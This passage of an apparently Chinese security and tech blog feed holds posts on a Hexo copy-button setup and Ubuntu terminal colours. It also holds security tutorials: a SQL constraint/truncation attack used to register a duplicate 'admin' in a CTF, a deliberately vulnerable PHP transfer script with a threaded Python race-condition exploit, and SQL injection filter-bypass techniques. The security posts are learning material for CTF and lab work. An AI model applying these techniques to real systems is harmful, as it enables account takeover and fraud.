class="number">1</span>);</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                $(<span class="keyword">this</span>).animate(&#123;</span><br><span class="line">                    opacity: <span class="number">0</span></span><br><span class="line">                &#125;, <span class="number">2000</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//感应滑鼠是否在代码区</span></span><br><span class="line">$(<span class="string">"figure"</span>).hover(</span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">//-------滑鼠活动在代码块内</span></span><br><span class="line">        <span class="comment">//移除之前含有复制标志代码块的 copyFlag</span></span><br><span class="line">        $(<span class="string">"[copyFlag]"</span>).removeAttr(<span class="string">"copyFlag"</span>);</span><br><span class="line">        <span class="comment">//在新的（当前滑鼠所在代码区）代码块插入标志：copyFlag</span></span><br><span class="line">        $(<span class="keyword">this</span>).find(<span class="string">".code"</span>).attr(<span class="string">"copyFlag"</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="comment">//获取复制按钮</span></span><br><span class="line">        $copyBtn = $(<span class="string">"#copyBtn"</span>);</span><br><span class="line">        <span class="keyword">if</span> ($copyBtn.lenght != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">//获取到按钮的前提下进行一下操作</span></span><br><span class="line">            <span class="comment">//停止按钮动画效果</span></span><br><span class="line">            <span class="comment">//设置为 显示状态</span></span><br><span class="line">            <span class="comment">//修改 复制按钮 位置到 当前代码块开始部位</span></span><br><span class="line">            <span class="comment">//设置代码块 左侧位置</span></span><br><span class="line">            $copyBtn.stop();</span><br><span class="line">            $copyBtn.css(<span class="string">"opacity"</span>, <span class="number">0.8</span>);</span><br><span class="line">            $copyBtn.css(<span class="string">"display"</span>, <span class="string">"block"</span>);</span><br><span class="line">            $copyBtn.css(<span class="string">"top"</span>, <span class="built_in">parseInt</span>($copyBtn.css(<span class="string">"top"</span>)) + $(<span class="keyword">this</span>).offset().top - $copyBtn.offset().top + <span class="number">3</span>);</span><br><span class="line">            $copyBtn.css(<span class="string">"left"</span>,$(<span class="keyword">this</span>).offset().left -$copyBtn.width() - <span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">//-------滑鼠离开代码块</span></span><br><span class="line">        <span class="comment">//设置复制按钮可见度 2秒内到 0</span></span><br><span class="line">        $(<span class="string">"#copyBtn"</span>).animate(&#123;</span><br><span class="line">            opacity: <span class="number">0</span></span><br><span class="line">        &#125;, <span class="number">2000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line"><span class="comment">//页面载入完成后，创建复制按钮</span></span><br><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  createCopyBtns();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="5-打开themes-next-layout-custom-新建文件custom-swig，代码如下"><a href="#5-打开themes-next-layout-custom-新建文件custom-swig，代码如下" class="headerlink" title="5.打开themes/next/layout/_custom/,新建文件custom.swig，代码如下:"></a>5.打开<code>themes/next/layout/_custom/</code>,新建文件<code>custom.swig</code>，代码如下:</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span> src=<span class="string">"/lib/clipboard/clipboard.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span> src=<span class="string">"/js/src/custom.js"</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="6-修改文件themes-next-layout-layout-swig-在标签-lt-body-gt-上面插入代码"><a href="#6-修改文件themes-next-layout-layout-swig-在标签-lt-body-gt-上面插入代码" class="headerlink" title="6.修改文件themes/next/layout/_layout.swig,在标签&lt;/body&gt;上面插入代码:"></a>6.修改文件<code>themes/next/layout/_layout.swig</code>,在标签<code>&lt;/body&gt;</code>上面插入代码:</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% include &apos;_custom/custom.swig&apos; %&#125;</span><br></pre></td></tr></table></figure><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://ppundsh.github.io/posts/8e7e/" target="_blank" rel="noopener">Flymia的HEXO添加複製功能</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;hexo next（5.1.3+）添加代码块复制功能&lt;/p&gt;
    
    </summary>
    
      <category term="Blog搭建" scheme="https://xianyu123.me/categories/Blog%E6%90%AD%E5%BB%BA/"/>
    
    
  </entry>
  
  <entry>
    <title>浅谈sql约束攻击</title>
    <link href="https://xianyu123.me/2019/02/04/%E6%B5%85%E8%B0%88sql%E7%BA%A6%E6%9D%9F%E6%94%BB%E5%87%BB/"/>
    <id>https://xianyu123.me/2019/02/04/浅谈sql约束攻击/</id>
    <published>2019-02-04T08:13:03.000Z</published>
    <updated>2019-05-11T12:52:58.628Z</updated>
    
    <content type="html"><![CDATA[<p>约束攻击，学习姿势</p><a id="more"></a><h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>在bugku做ctf题目的时候，发现了约束攻击这种手法，于是上google学习了新的姿势。感谢作者Dhaval Kapil的文章<a href="https://dhavalkapil.com/blogs/SQL-Attack-Constraint-Based/" target="_blank" rel="noopener">SQL Attack (Constraint-based)</a></p><h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><p>数据库字符串比较：数据库在进行字符串比较是会将两个字符串长度保持一致，短的字符串增加长度。假设A字符串为<code>hello</code>，B字符串为<code>hell</code>，数据库会把字符串B变成<code>hell</code>，增加一个空格以保持两个字符串长度一致</p><p><strong>INSERT截断</strong>：这是数据库的另一个特性，当设计一个字段时，我们都必须对其设定一个最大长度，比如CHAR(10)，VARCHAR(20)等等。但是当实际插入数据的长度超过限制时，数据库就会将其进行截断，只保留限定的长度。</p><h1 id="具体场景"><a href="#具体场景" class="headerlink" title="具体场景"></a>具体场景</h1><p>我们来创建一个数据表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> te_constraint(</span><br><span class="line">username <span class="built_in">varchar</span>(<span class="number">10</span>),</span><br><span class="line">passwd <span class="built_in">varchar</span>(<span class="number">10</span>)</span><br><span class="line">)<span class="keyword">charset</span>=utf8;</span><br></pre></td></tr></table></figure><p>然后向其中插入两组数据，第二组数据后面加入了6个空格</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> te_constraint <span class="keyword">values</span>(<span class="string">'admin'</span>,<span class="string">'123456'</span>),</span><br><span class="line">(<span class="string">'admin           '</span>,<span class="string">'12345678'</span>);</span><br></pre></td></tr></table></figure><p>然后我们发现查处了两组数据</p><p><img src="http://images.xianyu123.club/constraint1.png?imageslim" alt></p><h1 id="CTF中的约束攻击"><a href="#CTF中的约束攻击" class="headerlink" title="CTF中的约束攻击"></a>CTF中的约束攻击</h1><p>来自bugkuctf的<a href="http://123.206.31.85:49163/" target="_blank" rel="noopener">login1(SKCTF)</a></p><p>首先我们没用账号，所以先注册一波账号。</p><p><img src="http://images.xianyu123.club/bugku_skctf1_1.png?imageslim" alt></p><p>然后发现提示</p><p><img src="http://images.xianyu123.club/bugku_skctf1_2.png?imageslim" alt></p><p>然后我们就去注册一个admin账户</p><p><img src="http://images.xianyu123.club/bugku_skctf1_3.png?imageslim" alt></p><p>发现admin账户已经存在，如果是挖漏洞的话我会考虑弱口令，注入，xss，csrf等漏洞，这里的话已经知道是约束攻击，我们也不知道admin这个用户名长度是多少，就在admin后面加尽可能多的空格吧，如果不行就再多加一点空格，构造一个新的admin账户。</p><p>然后注册成功，得到flag</p><p><img src="http://images.xianyu123.club/bugku_skctf1_4.png?imageslim" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;约束攻击，学习姿势&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="https://xianyu123.me/categories/Web-Security/"/>
    
    
  </entry>
  
  <entry>
    <title>ubuntu server终端内置颜色开启</title>
    <link href="https://xianyu123.me/2019/02/03/ubuntu-server%E5%BD%A9%E8%89%B2%E7%BB%88%E7%AB%AF%E9%85%8D%E7%BD%AE/"/>
    <id>https://xianyu123.me/2019/02/03/ubuntu-server彩色终端配置/</id>
    <published>2019-02-03T10:06:41.000Z</published>
    <updated>2019-05-11T12:52:58.625Z</updated>
    
    <content type="html"><![CDATA[<p>ubuntu server彩色终端配置</p><a id="more"></a><p>因为腾讯云服务器买来终端默认只支持8中颜色，只有黑白的世界真的很寂寞，哈哈，所以就赶紧给服务器配一波颜色。</p><h1 id="判断终端色彩支持情况的方法"><a href="#判断终端色彩支持情况的方法" class="headerlink" title="判断终端色彩支持情况的方法"></a>判断终端色彩支持情况的方法</h1><h2 id="查看当前终端支持几种颜色"><a href="#查看当前终端支持几种颜色" class="headerlink" title="查看当前终端支持几种颜色"></a>查看当前终端支持几种颜色</h2><p>使用<code>tput colors</code>命令即可查看当前终端支持几种颜色</p><h2 id="所有终端类型和支持颜色位数"><a href="#所有终端类型和支持颜色位数" class="headerlink" title="所有终端类型和支持颜色位数"></a>所有终端类型和支持颜色位数</h2><p>使用以下命令即可列出系统所支持的所有终端类型，以及他们支持的颜色位数：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for T in `find /usr/share/terminfo -type f -printf '%f '`;do echo "$T `tput -T $T colors`";done|sort -nk2|tail -n20</span><br></pre></td></tr></table></figure><p>输出为：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">nsterm-build326 256</span><br><span class="line">nsterm-build343 256</span><br><span class="line">nsterm-build361 256</span><br><span class="line">putty-256color 256</span><br><span class="line">rxvt-256color 256</span><br><span class="line">rxvt-unicode-256color 256</span><br><span class="line">screen-256color-bce-s 256</span><br><span class="line">screen-256color-s 256</span><br><span class="line">screen.konsole-256color 256</span><br><span class="line">screen.mlterm-256color 256</span><br><span class="line">screen.putty-256color 256</span><br><span class="line">screen.vte-256color 256</span><br><span class="line">screen.xterm-256color 256</span><br><span class="line">st-256color 256</span><br><span class="line">terminator 256</span><br><span class="line">terminology 256</span><br><span class="line">tmux-256color 256</span><br><span class="line">vte-256color 256</span><br><span class="line">xterm+256color 256</span><br><span class="line">xterm+256setaf 256</span><br></pre></td></tr></table></figure><h2 id="查看当前终端类型"><a href="#查看当前终端类型" class="headerlink" title="查看当前终端类型"></a>查看当前终端类型</h2><p><code>$TERM</code>变量代表当前终端类型，可使用<code>echo $TERM</code>命令查看。</p><h2 id="输出当前支持的颜色"><a href="#输出当前支持的颜色" class="headerlink" title="输出当前支持的颜色"></a>输出当前支持的颜色</h2><p>运行以下命令，若输出了完整的256种颜色，就说明当前终端支持256色：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(x=`tput op` y=`printf %76s`;for i in &#123;0..256&#125;;do o=00$i;echo -e $&#123;o:$&#123;#o&#125;-3:3&#125; `tput setaf $i;tput setab $i`$&#123;y// /=&#125;$x;done)</span><br></pre></td></tr></table></figure><p><img src="http://images.xianyu123.club/color.png?imageslim" alt></p><p>若只有前8种颜色，说明当前配置是8色模式，默认情况下，<code>Ubuntu</code>中的Gnome-<code>Terminal</code>就只开启了8色支持。此时可通过修改<code>~/.bashrc</code>文件将其改为256色，在<code>.bashrc</code>文件中加入以下代码即可：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export TERM=vte-256color</span><br></pre></td></tr></table></figure><p>最后输入命令<code>source ~/.bashrc</code>，<strong>一定要输入</strong>，不然配置文件无法生效</p><h1 id="开启终端内置支持颜色"><a href="#开启终端内置支持颜色" class="headerlink" title="开启终端内置支持颜色"></a>开启终端内置支持颜色</h1><p>在<code>~/.bashrc</code>文件中去掉<code>force_color_promt</code>的注释即可</p><p><img src="http://images.xianyu123.club/linux_peise.png?imageslim" alt></p><p>然后重新ssh连接即可。</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="http://gaomf.cn/2017/01/16/Terminal_Color/" target="_blank" rel="noopener">判断终端色彩支持情况的方法</a></p><p><a href="http://yysfire.github.io/linux/how-to-check-linux-terminal-whether-support-256-colors.html" target="_blank" rel="noopener">如何查看Linux终端是否支持256色</a></p><p><a href="https://www.jianshu.com/p/c4946024b946" target="_blank" rel="noopener">解决.bashrc文件每次打开终端都需要source的问题</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ubuntu server彩色终端配置&lt;/p&gt;
    
    </summary>
    
      <category term="Linux" scheme="https://xianyu123.me/categories/Linux/"/>
    
    
  </entry>
  
  <entry>
    <title>浅谈Web中的条件竞争漏洞</title>
    <link href="https://xianyu123.me/2019/02/03/%E6%B5%85%E8%B0%88Web%E4%B8%AD%E7%9A%84%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E/"/>
    <id>https://xianyu123.me/2019/02/03/浅谈Web中的条件竞争漏洞/</id>
    <published>2019-02-03T02:14:10.000Z</published>
    <updated>2019-05-11T12:52:58.629Z</updated>
    
    <content type="html"><![CDATA[<p>Web中的条件竞争漏洞学习<br>合上吧，没有新姿势。</p><a id="more"></a><h1 id="进程和线程"><a href="#进程和线程" class="headerlink" title="进程和线程"></a>进程和线程</h1><p>在Windows操作系统中，一个程序只对应一个进程，里面可以有一个或多个线程。</p><p>线程是操作系统能够进行运算调度的最小单位。，比如一个word2013是一个进程，里面的保存就是一个线程，打印功能又是另外一个线程，等等。</p><p>再举一个例子，这里的Google Chrome就是一个进程，并且开了的43个就是子线程，加上一个主线程，对于进程Google Chrome来说，一共有44个线程，通俗讲即浏览器中开了44个标签页</p><p><img src="http://images.xianyu123.club/chrome_process.png?imageslim" alt></p><p>在UINX操作系统中，则没有线程概念，一个进程中（父进程）可以有多个子进程（多级嵌套）</p><p>如果你还是有点不明白的话请阅读这篇文章，<a href="http://www.ruanyifeng.com/blog/2013/04/processes_and_threads.html" target="_blank" rel="noopener">进程与线程的一个简单解释</a></p><h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p>讲解了进程和线程的概念之后，我们来讲解条件竞争漏洞的成因</p><p>开发者在进行代码开发时常常倾向于认为代码会以线性的方式执行，而且他们忽视了并行服务器会并发执行多个线程，这就会导致意想不到的结果。</p><p>线程同步机制确保两个及以上的并发进程或线程不同时执行某些特定的程序段，也被称之为临界区（critical section）,如果没有应用好同步技术则会发生“竞争条件”问题。我理解的就是一个独木桥，两个（可以更多）跑的一样快的人一起通过，无法预测谁通过了独木桥，这里就存在竞争。</p><h1 id="案例分析"><a href="#案例分析" class="headerlink" title="案例分析"></a>案例分析</h1><p>现在我们模拟一个<code>my用户</code>转账给<code>Jack用户的操作</code>，<code>my用户</code>的余额是1，<code>Jack用户</code>的余额是999，转账的条件是<code>my</code>只能转1块钱给<code>Jack</code>。</p><p>前端水平很渣很渣，各位大佬轻喷。。。</p><p><img src="http://images.xianyu123.club/race_condition1.png?imageslim" alt></p><p>后端代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//连接数据库的函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">conn</span><span class="params">()</span></span>&#123;</span><br><span class="line">$dns = <span class="string">"mysql:host=localhost;dbname=test"</span>;</span><br><span class="line"><span class="comment">//连接数据库</span></span><br><span class="line">$db = <span class="keyword">new</span> PDO($dns, <span class="string">"root"</span>, <span class="string">"root"</span>);</span><br><span class="line"><span class="keyword">return</span> $db;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$db = conn();</span><br><span class="line"><span class="comment">//查询my的money</span></span><br><span class="line">$sql = <span class="string">'select money from te_money where id = "my";'</span>;</span><br><span class="line">$money_my = $db-&gt;query($sql);</span><br><span class="line"><span class="keyword">foreach</span>($money_my <span class="keyword">as</span> $row1)</span><br><span class="line"><span class="comment">//查询Jack的money</span></span><br><span class="line">$sql = <span class="string">'select money from te_money where id = "Jack";'</span>;</span><br><span class="line">$money_jack = $db-&gt;query($sql);</span><br><span class="line"><span class="keyword">foreach</span>($money_jack <span class="keyword">as</span> $row2)</span><br><span class="line">$add_money = @$_POST[<span class="string">'add_money'</span>];</span><br><span class="line"><span class="keyword">if</span>($add_money &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;script type='text/javascript'&gt;alert('转账金额必须大于0')&lt;/script&gt;"</span>;</span><br><span class="line">Header(<span class="string">"refresh:0.1;url='./test.php'"</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$over_my = $row1[<span class="string">'money'</span>] - $add_money;</span><br><span class="line"><span class="comment">//判断转账的钱扣除后my的余额是否为负数</span></span><br><span class="line"><span class="keyword">if</span>($over_my &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;script type='text/javascript'&gt;alert('余额不足')&lt;/script&gt;"</span>;</span><br><span class="line">Header(<span class="string">"refresh:0.1;url='./test.php'"</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//更新my的余额</span></span><br><span class="line">$sql = <span class="string">'update te_money set money='</span>.$over_my.<span class="string">' where id="my";'</span>;</span><br><span class="line">$db-&gt;exec($sql);</span><br><span class="line"><span class="comment">//更新Jack的余额</span></span><br><span class="line">$over_jack = $row2[<span class="string">'money'</span>]+$add_money;</span><br><span class="line">$sql1 = <span class="string">'update te_money set money='</span>.$over_jack.<span class="string">' where id="Jack";'</span>;</span><br><span class="line">$db-&gt;exec($sql1);</span><br><span class="line"></span><br><span class="line"><span class="comment">//转账完成之后要查询对应的余额</span></span><br><span class="line"><span class="comment">//查询my的money</span></span><br><span class="line">$sql = <span class="string">'select money from te_money where id = "my";'</span>;</span><br><span class="line">$money_my = $db-&gt;query($sql);</span><br><span class="line"><span class="keyword">foreach</span>($money_my <span class="keyword">as</span> $row1)</span><br><span class="line"><span class="comment">//查询Jack的money</span></span><br><span class="line">$sql = <span class="string">'select money from te_money where id = "Jack";'</span>;</span><br><span class="line">$money_jack = $db-&gt;query($sql);</span><br><span class="line"><span class="keyword">foreach</span>($money_jack <span class="keyword">as</span> $row2)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">'http://127.0.0.2:82/vulnerability/race_condition/test.php'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">money</span><span class="params">()</span>:</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'add_money'</span>:<span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(url=url,data=data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">multithreading</span><span class="params">()</span>:</span></span><br><span class="line">    threads = []</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">        t = threading.Thread(target=money)</span><br><span class="line">        t.start()</span><br><span class="line">        threads.append(t)</span><br><span class="line">    <span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line">        thread.join()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    multithreading()</span><br></pre></td></tr></table></figure><p>用py模拟转账，发现一直是如下情况，明明多线程会出现<code>my</code>账号负数的呀，而且我的网络状况也算稳定</p><p><img src="http://images.xianyu123.club/race_condition3.png?imageslim" alt></p><p>后来意识到我在写代码的时候判断了余额小于0就<code>exit()</code></p><p><img src="http://images.xianyu123.club/race_condition4.png?imageslim" alt></p><p>在去掉了<code>exit()</code>后发现<code>my</code>的余额出现了负数</p><p><img src="http://images.xianyu123.club/race_condition2.png?imageslim" alt></p><p>因为这个漏洞很受环境因素的影响，比如网络延迟、服务器的处理能力等，所以只执行一次可能并不会成功，条件竞争漏洞有时很难通过黑盒/灰盒的方法来进行挖掘。</p><p>可能的场景：签到、积分、抽奖、优惠券、订单生成/取消等</p><h1 id="CTF中的条件竞争漏洞"><a href="#CTF中的条件竞争漏洞" class="headerlink" title="CTF中的条件竞争漏洞"></a>CTF中的条件竞争漏洞</h1><p>moctf中的题目<a href="http://119.23.73.3:5006/web2/index2.php" target="_blank" rel="noopener">没时间解释了</a></p><p>具体参考<a href="https://xianyu123.me/2018/11/10/MOCTF_Web_writeup/">moctf_wp_没时间解释了</a></p><p>这题就是需要我们一边不停上传，一边不停地访问上传成功的文件，然后就可以做出题目了。</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="http://seaii-blog.com/index.php/2017/04/26/49.html" target="_blank" rel="noopener">Web中的条件竞争漏洞</a></p><p><a href="https://www.freebuf.com/articles/network/107077.html" target="_blank" rel="noopener">测试Web应用程序中的竞争条件</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Web中的条件竞争漏洞学习&lt;br&gt;合上吧，没有新姿势。&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="https://xianyu123.me/categories/Web-Security/"/>
    
    
  </entry>
  
  <entry>
    <title>浅谈mysql宽字节注入</title>
    <link href="https://xianyu123.me/2019/01/30/%E6%B5%85%E8%B0%88mysql%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/"/>
    <id>https://xianyu123.me/2019/01/30/浅谈mysql宽字节注入/</id>
    <published>2019-01-30T08:58:18.000Z</published>
    <updated>2019-05-11T12:52:58.628Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>sql注入绕过技巧(积累中)</title>
    <link href="https://xianyu123.me/2019/01/29/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7-%E7%A7%AF%E7%B4%AF%E4%B8%AD/"/>
    <id>https://xianyu123.me/2019/01/29/sql注入绕过技巧-积累中/</id>
    <published>2019-01-29T08:26:59.000Z</published>
    <updated>2019-05-11T12:52:58.624Z</updated>
    
    <content type="html"><![CDATA[<p>sql注入的绕过姿势（正在努力积累中）</p><a id="more"></a><h2 id="空格过滤绕过"><a href="#空格过滤绕过" class="headerlink" title="空格过滤绕过"></a>空格过滤绕过</h2><h3 id="用圆括号包起来"><a href="#用圆括号包起来" class="headerlink" title="用圆括号包起来"></a>用圆括号包起来</h3><p>关键词是<strong>不能</strong>被括号包起来的，如<code>select</code>，<code>where</code>，<code>from</code>等</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select(name)from(worm);</span><br><span class="line">+<span class="comment">-------+</span></span><br><span class="line">| name  |</span><br><span class="line">+<span class="comment">-------+</span></span><br><span class="line">| abcde |</span><br><span class="line">+<span class="comment">-------+</span></span><br><span class="line">1 row in <span class="keyword">set</span></span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span>(<span class="keyword">group_concat</span>(table_name))<span class="keyword">from</span>(information_schema.tables)<span class="keyword">where</span>(table_schema=<span class="keyword">database</span>())</span><br><span class="line">+<span class="comment">----------------------------+</span></span><br><span class="line">| (<span class="keyword">group_concat</span>(table_name)) |</span><br><span class="line">+<span class="comment">----------------------------+</span></span><br><span class="line">| article,<span class="keyword">type</span>,<span class="keyword">user</span>          |</span><br><span class="line">+<span class="comment">----------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">row</span> <span class="keyword">in</span> <span class="keyword">set</span></span><br></pre></td></tr></table></figure><h3 id="使用-绕过"><a href="#使用-绕过" class="headerlink" title="使用/**/绕过"></a>使用/**/绕过</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select/**/name/**/from/**/user</span><br><span class="line">+<span class="comment">-------+</span></span><br><span class="line">| name  |</span><br><span class="line">+<span class="comment">-------+</span></span><br><span class="line">| admin |</span><br><span class="line">| test  |</span><br><span class="line">+<span class="comment">-------+</span></span><br><span class="line">2 rows in <span class="keyword">set</span></span><br></pre></td></tr></table></figure><h3 id="使用回车绕过"><a href="#使用回车绕过" class="headerlink" title="使用回车绕过"></a>使用回车绕过</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>附上：<a href="http://www.w3school.com.cn/tags/html_ref_urlencode.html" target="_blank" rel="noopener">URL编码参考表</a></p><h3 id="使用-反引号绕过"><a href="#使用-反引号绕过" class="headerlink" title="使用`,反引号绕过"></a>使用`,反引号绕过</h3><p>将需要查询的东西用<code>\`</code>包起来，和圆括号用法类似，关键字不能被包起来</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select*from`worm`</span><br><span class="line">+<span class="comment">-------+</span></span><br><span class="line">| name  |</span><br><span class="line">+<span class="comment">-------+</span></span><br><span class="line">| abcde |</span><br><span class="line">+<span class="comment">-------+</span></span><br><span class="line">1 row in <span class="keyword">set</span></span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span><span class="string">`name`</span><span class="keyword">from</span><span class="string">`worm`</span></span><br><span class="line">+<span class="comment">-------+</span></span><br><span class="line">| <span class="keyword">name</span>  |</span><br><span class="line">+<span class="comment">-------+</span></span><br><span class="line">| abcde |</span><br><span class="line">+<span class="comment">-------+</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">row</span> <span class="keyword">in</span> <span class="keyword">set</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;sql注入的绕过姿势（正在努力积累中）&lt;/p&gt;
    
    </summary>
    
